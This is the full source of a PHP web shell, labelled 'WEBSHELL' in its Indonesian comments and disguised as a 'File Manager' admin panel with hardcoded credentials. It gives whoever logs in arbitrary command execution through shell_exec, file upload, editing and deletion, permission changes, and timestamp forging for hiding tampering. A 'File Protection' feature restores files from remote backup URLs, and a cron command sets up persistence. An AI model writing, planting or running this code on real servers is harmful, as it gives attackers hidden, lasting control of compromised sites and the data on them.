<?php
session_start();

// ================ KONFIGURASI AWAL ================
$USERNAME = 'nigaseo';
$PASSWORD = '0348cbac222341dd6c29128531d71ce2';
$PROTEKSI_CONFIG = __DIR__ . '/.proteksi_config.json';
$PROTEKSI_LOG = __DIR__ . '/.proteksi_log.txt';

// ================ LOGOUT FUNCTION ================
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ================ BAGIAN LOGIN ================
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['user']) && isset($_POST['pass'])) {
        if ($_POST['user'] === $USERNAME && $_POST['pass'] === $PASSWORD) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid username or password";
        }
    }
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Login Admin</title>
        <style>
            :root {
                --primary: #4361ee;
                --secondary: #3f37c9;
                --dark: #212529;
                --light: #f8f9fa;
                --danger: #e63946;
                --success: #2a9d8f;
            }
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
                font-family: "Segoe UI", Roboto, sans-serif;
            }
            body {
                background-color: var(--light);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            .login-container {
                background: white;
                border-radius: 8px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                width: 100%;
                max-width: 400px;
                padding: 40px;
            }
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            .login-header h2 {
                color: var(--dark);
                margin-bottom: 10px;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: var(--dark);
                font-weight: 500;
            }
            .form-group input {
                width: 100%;
                padding: 12px 15px;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-size: 16px;
                transition: border 0.3s;
            }
            .form-group input:focus {
                border-color: var(--primary);
                outline: none;
            }
            .btn {
                width: 100%;
                padding: 12px;
                background-color: var(--primary);
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                cursor: pointer;
                transition: background 0.3s;
            }
            .btn:hover {
                background-color: var(--secondary);
            }
            .error-message {
                color: var(--danger);
                text-align: center;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h2>Admin Panel</h2>
                <p>Please sign in to continue</p>
            </div>';
    if (isset($error)) echo "<div class='error-message'>$error</div>";
    echo '<form method="POST">
                <div class="form-group">
                    <label for="user">Username</label>
                    <input type="text" id="user" name="user" placeholder="Enter username" required>
                </div>
                <div class="form-group">
                    <label for="pass">Password</label>
                    <input type="password" id="pass" name="pass" placeholder="Enter password" required>
                </div>
                <button type="submit" class="btn">Sign In</button>
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// ================ BAGIAN PROTEKSI FILE ================
if (isset($_POST['add_proteksi'])) {
    $config = file_exists($PROTEKSI_CONFIG) ? json_decode(file_get_contents($PROTEKSI_CONFIG), true) : [];
    $config[] = [
        'target' => $_POST['target_file'],
        'backupUrl' => $_POST['backup_url']
    ];
    file_put_contents($PROTEKSI_CONFIG, json_encode($config, JSON_PRETTY_PRINT));
    $_SESSION['message'] = "File added to protection successfully";
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_GET['del_proteksi'])) {
    $config = json_decode(file_get_contents($PROTEKSI_CONFIG), true);
    unset($config[$_GET['del_proteksi']]);
    file_put_contents($PROTEKSI_CONFIG, json_encode(array_values($config), JSON_PRETTY_PRINT));
    $_SESSION['message'] = "File removed from protection";
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ================ BAGIAN UTAMA WEBSHELL ================
$currentDir = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!realpath($currentDir)) $currentDir = getcwd();
chdir($currentDir);

// Fungsi helper
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function perms($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

// ================ FILE UPLOAD ================
if (isset($_POST['up']) && isset($_FILES['upload'])) {
    $targetFile = $currentDir . '/' . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $targetFile)) {
        $_SESSION['message'] = "File uploaded successfully";
    } else {
        $_SESSION['error'] = "Failed to upload file";
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ================ FILE/FOLDER RENAME ================
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $oldPath = $currentDir . '/' . $_GET['rename'];
    $newPath = $currentDir . '/' . $_POST['newname'];
    
    // Validate new name
    if (empty($_POST['newname'])) {
        $_SESSION['error'] = "New name cannot be empty";
    } 
    // Check if new name contains invalid characters
    elseif (preg_match('/[\/\\\\:*?"<>|]/', $_POST['newname'])) {
        $_SESSION['error'] = "Invalid characters in filename";
    }
    // Check if file/folder exists
    elseif (!file_exists($oldPath)) {
        $_SESSION['error'] = "File/folder does not exist";
    }
    // Check if new name already exists
    elseif (file_exists($newPath)) {
        $_SESSION['error'] = "A file/folder with that name already exists";
    }
    // Attempt rename
    elseif (rename($oldPath, $newPath)) {
        $_SESSION['message'] = "Successfully renamed " . htmlspecialchars($_GET['rename']) . " to " . htmlspecialchars($_POST['newname']);
    } else {
        $_SESSION['error'] = "Failed to rename file/folder";
    }
    
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ================ CHANGE PERMISSIONS ================
if (isset($_GET['chmod']) && isset($_POST['mode'])) {
    $file = $currentDir . '/' . $_GET['chmod'];
    $mode = octdec($_POST['mode']);
    if (chmod($file, $mode)) {
        $_SESSION['message'] = "Permissions changed successfully";
    } else {
        $_SESSION['error'] = "Failed to change permissions";
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ================ CHANGE FILE DATE ================
if (isset($_GET['touch']) && isset($_POST['newdate'])) {
    $file = $currentDir . '/' . $_GET['touch'];
    $timestamp = strtotime($_POST['newdate']);
    if (touch($file, $timestamp)) {
        $_SESSION['message'] = "File date modified successfully";
    } else {
        $_SESSION['error'] = "Failed to modify file date";
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ================ FILE EDITOR ================
if (isset($_GET['edit'])) {
    $file = $currentDir . '/' . $_GET['edit'];
    if (isset($_POST['content'])) {
        if (file_put_contents($file, $_POST['content']) !== false) {
            $_SESSION['message'] = "File saved successfully";
            header("Location: ?path=" . urlencode($currentDir));
            exit;
        } else {
            $_SESSION['error'] = "Failed to save file";
        }
    }
    
    $content = file_exists($file) ? htmlspecialchars(file_get_contents($file)) : '';
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Edit File</title>
        <style>
            :root {
                --primary: #4361ee;
                --dark: #212529;
                --light: #f8f9fa;
            }
            body {
                background-color: var(--light);
                font-family: "Segoe UI", Roboto, sans-serif;
                padding: 20px;
            }
            .editor-container {
                max-width: 1200px;
                margin: 0 auto;
            }
            .editor-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
            }
            .editor-title {
                font-size: 20px;
                color: var(--dark);
            }
            textarea {
                width: 100%;
                height: 500px;
                padding: 15px;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-family: "Courier New", monospace;
                font-size: 14px;
            }
            .btn {
                padding: 8px 16px;
                background-color: var(--primary);
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="editor-container">
            <div class="editor-header">
                <h2 class="editor-title">Editing: '.htmlspecialchars($_GET['edit']).'</h2>
                <a href="?path='.urlencode($currentDir).'" class="btn">Back</a>
            </div>
            <form method="POST">
                <textarea name="content">'.$content.'</textarea>
                <div style="margin-top: 15px;">
                    <button type="submit" class="btn">Save Changes</button>
                </div>
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// ================ PROSES DELETE ================
if (isset($_GET['delete'])) {
    $target = $currentDir . '/' . $_GET['delete'];
    if (is_file($target)) {
        @chmod($target, 0777);
        if (@unlink($target)) {
            $_SESSION['message'] = "File deleted successfully";
        } else {
            $_SESSION['error'] = "Failed to delete file";
        }
    } elseif (is_dir($target)) {
        @chmod($target, 0777);
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($files as $file) {
            if ($file->isDir()) {
                @rmdir($file->getRealPath());
            } else {
                @unlink($file->getRealPath());
            }
        }
        if (@rmdir($target)) {
            $_SESSION['message'] = "Directory deleted successfully";
        } else {
            $_SESSION['error'] = "Failed to delete directory";
        }
    }
    header("Location: ?path=" . urlencode($currentDir));
    exit;
}

// ================ SSH COMMAND EXECUTION ================
if (isset($_POST['ssh_cmd'])) {
    $command = $_POST['ssh_cmd'];
    $output = shell_exec("$command 2>&1");
    $_SESSION['ssh_output'] = htmlspecialchars($output);
    header("Location: ".$_SERVER['PHP_SELF']."?tab=terminal");
    exit;
}

// ================ TAMPILAN HTML ================
echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        :root {
            --primary: #4361ee;
            --primary-dark: #3f37c9;
            --secondary: #3a86ff;
            --danger: #e63946;
            --warning: #ffbe0b;
            --success: #2a9d8f;
            --dark: #212529;
            --gray: #6c757d;
            --light: #f8f9fa;
            --border: #dee2e6;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "Segoe UI", Roboto, sans-serif;
        }
        
        body {
            background-color: var(--light);
            color: var(--dark);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border);
        }
        
        .header h1 {
            font-size: 24px;
            color: var(--dark);
        }
        
        /* Tabs */
        .tabs {
            display: flex;
            border-bottom: 1px solid var(--border);
            margin-bottom: 20px;
        }
        
        .tab-btn {
            padding: 12px 20px;
            background: none;
            border: none;
            cursor: pointer;
            font-size: 16px;
            color: var(--gray);
            border-bottom: 2px solid transparent;
            transition: all 0.3s;
        }
        
        .tab-btn.active {
            color: var(--primary);
            border-bottom-color: var(--primary);
            font-weight: 500;
        }
        
        .tab-btn:hover:not(.active) {
            color: var(--dark);
        }
        
        .tab-content {
            display: none;
            padding: 20px 0;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Alerts */
        .alert {
            padding: 12px 15px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        
        .alert-success {
            background-color: rgba(42, 157, 143, 0.2);
            color: var(--success);
            border-left: 4px solid var(--success);
        }
        
        .alert-danger {
            background-color: rgba(230, 57, 70, 0.2);
            color: var(--danger);
            border-left: 4px solid var(--danger);
        }
        
        /* Breadcrumb */
        .breadcrumb {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding: 10px 15px;
            background-color: white;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .breadcrumb a {
            color: var(--primary);
            text-decoration: none;
            margin: 0 5px;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .breadcrumb-separator {
            color: var(--gray);
        }
        
        /* File Manager */
        .file-actions {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }.btn {
            padding: 8px 16px;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid transparent;
        }
        
        .btn-primary {
            background-color: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background-color: var(--primary-dark);
        }
        
        .btn-outline {
            background-color: white;
            border-color: var(--border);
            color: var(--dark);
        }
        
        .btn-outline:hover {
            background-color: var(--light);
        }
        
        .btn-danger {
            background-color: var(--danger);
            color: white;
        }
        
        .btn-danger:hover {
            background-color: #c1121f;
        }
        
        /* File Table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            background-color: white;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            border-radius: 4px;
            overflow: hidden;
        }
        
        .file-table th {
            background-color: var(--light);
            padding: 12px 15px;
            text-align: left;
            font-weight: 500;
        }
        
        .file-table td {
            padding: 12px 15px;
            border-top: 1px solid var(--border);
        }
        
        .file-table tr:hover {
            background-color: rgba(58, 134, 255, 0.05);
        }
        
        .file-icon {
            margin-right: 8px;
        }
        
        .file-name {
            display: flex;
            align-items: center;
        }
        
        .file-actions-cell {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .file-actions-cell .btn {
            padding: 4px 8px;
            font-size: 13px;
        }
        
        /* Forms */
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid var(--border);
            border-radius: 4px;
            font-size: 14px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
        }
        
        /* Protection Tab */
        .protection-form {
            background-color: white;
            padding: 20px;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        .protection-list {
            background-color: white;
            padding: 20px;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .protection-item {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid var(--border);
        }
        
        .protection-item:last-child {
            border-bottom: none;
        }
        
        /* SSH Terminal */
        .terminal {
            background-color: #1e1e1e;
            color: #f0f0f0;
            padding: 20px;
            border-radius: 4px;
            font-family: "Courier New", monospace;
            margin-bottom: 20px;
        }
        
        .terminal-output {
            height: 300px;
            overflow-y: auto;
            margin-bottom: 15px;
            white-space: pre-wrap;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
        }
        
        .terminal-input input {
            flex: 1;
            background-color: #2d2d2d;
            border: 1px solid #444;
            color: #f0f0f0;
            padding: 10px;
            border-radius: 4px;
        }
        
        .terminal-input button {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .quick-commands {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .quick-commands button {
            background-color: var(--light);
            border: 1px solid var(--border);
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 13px;
        }
        
        /* Rename Form Styles */
        .rename-form {
            display: inline-flex;
            gap: 5px;
            align-items: center;
        }
        
        .rename-input {
            padding: 4px 8px;
            border: 1px solid var(--border);
            border-radius: 4px;
            width: 150px;
            font-size: 13px;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .file-table {
                display: block;
                overflow-x: auto;
            }
            
            .file-actions {
                flex-direction: column;
            }
            
            .file-actions-cell {
                flex-direction: column;
                align-items: flex-start;
                gap: 5px;
            }
            
            .rename-form {
                width: 100%;
            }
            
            .rename-input {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>File Manager</h1>
            <div>
                <a href="?logout" class="btn btn-outline">Logout</a>
            </div>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" data-tab="file-manager">File Manager</button>
            <button class="tab-btn" data-tab="file-protection">File Protection</button>
            <button class="tab-btn" data-tab="terminal">Terminal</button>
            <button class="tab-btn" data-tab="cron">Cron Jobs</button>
        </div>';
        
// Display messages
if (isset($_SESSION['message'])) {
    echo '<div class="alert alert-success">'.$_SESSION['message'].'</div>';
    unset($_SESSION['message']);
}
if (isset($_SESSION['error'])) {
    echo '<div class="alert alert-danger">'.$_SESSION['error'].'</div>';
    unset($_SESSION['error']);
}

// Get active tab from URL or default to file manager
$activeTab = isset($_GET['tab']) ? $_GET['tab'] : 'file-manager';

// File Manager Tab
echo '<div id="file-manager" class="tab-content '.($activeTab === 'file-manager' ? 'active' : '').'">
            <div class="breadcrumb">
                <a href="?path='.urlencode(dirname($currentDir)).'&tab=file-manager">Up</a>
                <span class="breadcrumb-separator">/</span>
                <span>'.htmlspecialchars($currentDir).'</span>
            </div>
            
            <div class="file-actions">
                <form method="POST" enctype="multipart/form-data" style="display: flex; gap: 10px; width: 100%;">
                    <input type="file" name="upload" class="form-control" style="flex: 1;">
                    <button type="submit" name="up" class="btn btn-primary">Upload</button>
                </form>
            </div>
            
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>';

$files = scandir($currentDir);
foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $filePath = $currentDir . '/' . $file;
    $isDir = is_dir($filePath);
    
    echo '<tr>
            <td>
                <div class="file-name">
                    <span class="file-icon">'.($isDir ? '📁' : '📄').'</span>
                    '.($isDir ? 
                        '<a href="?path='.urlencode($filePath).'&tab=file-manager">'.htmlspecialchars($file).'</a>' : 
                        htmlspecialchars($file)).'
                </div>
            </td>
            <td>'.($isDir ? '-' : formatSize(filesize($filePath))).'</td>
            <td>'.perms($filePath).'</td>
            <td>'.date("Y-m-d H:i:s", filemtime($filePath)).'</td>
            <td>
                <div class="file-actions-cell">
                    '.(!$isDir ? '<a href="?edit='.urlencode($file).'&path='.urlencode($currentDir).'" class="btn btn-outline">Edit</a>' : '').'
                    
                    <a href="?delete='.urlencode($file).'&path='.urlencode($currentDir).'" 
                       onclick="return confirm(\'Are you sure you want to delete '.htmlspecialchars($file).'?\')" 
                       class="btn btn-danger">Delete</a>
                    
                    <form class="rename-form" method="POST" action="?rename='.urlencode($file).'&path='.urlencode($currentDir).'">
                        <input type="text" name="newname" value="'.htmlspecialchars($file).'" 
                               class="rename-input" required>
                        <button type="submit" class="btn btn-primary">Rename</button>
                    </form>
                    
                    <form method="POST" action="?chmod='.urlencode($file).'&path='.urlencode($currentDir).'">
                        <input type="text" name="mode" placeholder="0755" value="'.perms($filePath).'" size="4" required>
                        <button type="submit" class="btn btn-outline">Chmod</button>
                    </form>
                    
                    <form method="POST" action="?touch='.urlencode($file).'&path='.urlencode($currentDir).'">
                        <input type="datetime-local" name="newdate" value="'.date('Y-m-d\TH:i:s', filemtime($filePath)).'" required>
                        <button type="submit" class="btn btn-outline">Date</button>
                    </form>
                </div>
            </td>
        </tr>';
}

echo '</tbody>
        </table>
    </div>';
    
// File Protection Tab
echo '<div id="file-protection" class="tab-content '.($activeTab === 'file-protection' ? 'active' : '').'">
        <div class="protection-form">
            <h3>Add File Protection</h3>
            <form method="POST">
                <div class="form-group">
                    <label class="form-label">File Path</label>
                    <input type="text" name="target_file" class="form-control" placeholder="/path/to/file.php" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Backup URL</label>
                    <input type="text" name="backup_url" class="form-control" placeholder="https://example.com/backup.txt" required>
                </div>
                <button type="submit" name="add_proteksi" class="btn btn-primary">Add Protection</button>
            </form>
        </div>
        
        <div class="protection-list">
            <h3>Protected Files</h3>';

if (file_exists($PROTEKSI_CONFIG)) {
    $config = json_decode(file_get_contents($PROTEKSI_CONFIG), true);
    if (!empty($config)) {
        foreach ($config as $i => $file) {
            echo '<div class="protection-item">
                    <div>
                        <strong>'.htmlspecialchars($file['target']).'</strong><br>
                        <small>'.htmlspecialchars($file['backupUrl']).'</small>
                    </div>
                    <a href="?del_proteksi='.$i.'&tab=file-protection" class="btn btn-danger">Remove</a>
                </div>';
        }
    } else {
        echo '<p>No files are currently protected.</p>';
    }
} else {
    echo '<p>No protection configuration found.</p>';
}

echo '</div>
    </div>';
    
// Terminal Tab
echo '<div id="terminal" class="tab-content '.($activeTab === 'terminal' ? 'active' : '').'">
        <div class="terminal">
            <h3 style="color: white; margin-bottom: 15px;">Terminal</h3>
            <form method="POST">
                <div class="terminal-input">
                    <input type="text" name="ssh_cmd" placeholder="Enter command..." required>
                    <button type="submit">Execute</button>
                </div>
            </form>
            
            <div class="quick-commands">
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'ls -la\'">List Files</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'df -h\'">Disk Space</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'free -m\'">Memory</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'service apache2 status\'">Apache Status</button>
                <button onclick="document.querySelector(\'[name=ssh_cmd]\').value=\'tail -n 50 /var/log/apache2/error.log\'">View Logs</button>
            </div>';
            
if (isset($_SESSION['ssh_output'])) {
    echo '<div class="terminal-output">'.$_SESSION['ssh_output'].'</div>';
    unset($_SESSION['ssh_output']);
}

echo '</div>
    </div>';
    
// Cron Jobs Tab
echo '<div id="cron" class="tab-content '.($activeTab === 'cron' ? 'active' : '').'">
        <div style="background-color: white; padding: 20px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
            <h3>Cron Job Setup</h3>
            <p>To set up automatic file protection monitoring, add this to your crontab:</p>
            
            <div style="background-color: var(--light); padding: 15px; border-radius: 4px; margin-bottom: 20px;">
                <code>*/5 * * * * /usr/bin/php '.htmlspecialchars(__FILE__).' --cron</code>
            </div>
            
            <p>Or run this command to add it automatically:</p>
            
            <div style="background-color: var(--light); padding: 15px; border-radius: 4px;">
                <code>(crontab -l ; echo "*/5 * * * * /usr/bin/php '.htmlspecialchars(__FILE__).' --cron") | crontab -</code>
            </div>
        </div>
    </div>';

echo '<script>
        // Tab functionality
        document.querySelectorAll(".tab-btn").forEach(btn => {
            btn.addEventListener("click", function() {
                const tabId = this.getAttribute("data-tab");
                window.location.href = "?path='.urlencode($currentDir).'&tab=" + tabId;
            });
        });
        
        // Set active tab based on URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const activeTab = urlParams.get("tab") || "file-manager";
        document.querySelector(`.tab-btn[data-tab="${activeTab}"]`).classList.add("active");
        document.getElementById(activeTab).classList.add("active");
        
        // Enhanced rename validation
        document.querySelectorAll(".rename-form").forEach(form => {
            form.addEventListener("submit", function(e) {
                const newName = this.querySelector(".rename-input").value;
                let originalName = this.getAttribute("action").split("rename=")[1].split("&")[0];
                originalName = decodeURIComponent(originalName);
                
                // Don\'t submit if name didn\'t change
                if (newName === originalName) {
                    e.preventDefault();
                    alert("Please enter a different name");
                    return false;
                }
                
                return true;});
        });
    </script>
</body>
</html>';
?>